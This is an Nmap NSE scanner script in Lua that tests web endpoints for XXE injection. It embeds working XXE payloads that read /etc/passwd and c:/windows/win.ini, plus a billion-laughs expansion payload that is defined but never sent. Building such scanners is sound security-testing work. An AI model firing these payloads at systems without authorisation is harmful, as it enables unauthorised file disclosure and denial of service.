-- XML Injection Detection
-- Tests for XML injection and XXE vulnerabilities

local http = require("http")
local stdnse = require("stdnse")

description = [[
Tests for XML injection and XML External Entity (XXE) vulnerabilities
by sending malicious XML payloads to web endpoints.
]]

author = "Nemue Security Team"
license = "MIT"
categories = {"vuln", "intrusive", "exploit"}

portrule = function(host, port)
    return port.protocol == "tcp" and
           (port.service == "http" or port.service == "https" or
            port.number == 80 or port.number == 443 or
            port.number == 8080)
end

action = function(host, port)
    local output = {}
    local findings = {}

    local xxe_payload = '<?xml version="1.0" encoding="UTF-8"?>' ..
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>' ..
        '<root>&xxe;</root>'

    local xxe_payload_win = '<?xml version="1.0" encoding="UTF-8"?>' ..
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>' ..
        '<root>&xxe;</root>'

    local billion_laughs = '<?xml version="1.0"?>' ..
        '<!DOCTYPE lolz [<!ENTITY lol "lol">' ..
        '<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]>' ..
        '<root>&lol2;</root>'

    local endpoints = {"/api/", "/xmlrpc.php", "/soap", "/wsdl", "/service"}

    for _, endpoint in ipairs(endpoints) do
        local check = http.get(host.ip, port, endpoint)
        if check and check.status and check.status ~= 404 then
            local headers = {["Content-Type"] = "application/xml"}
            local r = http.post(host.ip, port, endpoint, headers, nil, xxe_payload)
            if r and r.body then
                if r.body:find("root:%w*:0:0") then
                    table.insert(findings, {
                        endpoint = endpoint,
                        type = "XXE - File Read",
                        payload = "file:///etc/passwd"
                    })
                end
            end

            local r2 = http.post(host.ip, port, endpoint, headers, nil, xxe_payload_win)
            if r2 and r2.body then
                if r2.body:find("%[boot loader%]") or r2.body:find("%[fonts%]") then
                    table.insert(findings, {
                        endpoint = endpoint,
                        type = "XXE - Windows File Read",
                        payload = "file:///c:/windows/win.ini"
                    })
                end
            end
        end
    end

    if #findings > 0 then
        table.insert(output, "XML Injection/XXE Vulnerabilities Found:")
        table.insert(output, "")
        for _, f in ipairs(findings) do
            table.insert(output, "[!] Endpoint: " .. f.endpoint)
            table.insert(output, "[!]   Type: " .. f.type)
            table.insert(output, "[!]   Payload: " .. f.payload)
            table.insert(output, "")
        end
        table.insert(output, "[!] CRITICAL: Allows file read and potential SSRF")
        return stdnse.format_output(true, output)
    end

    return nil
end
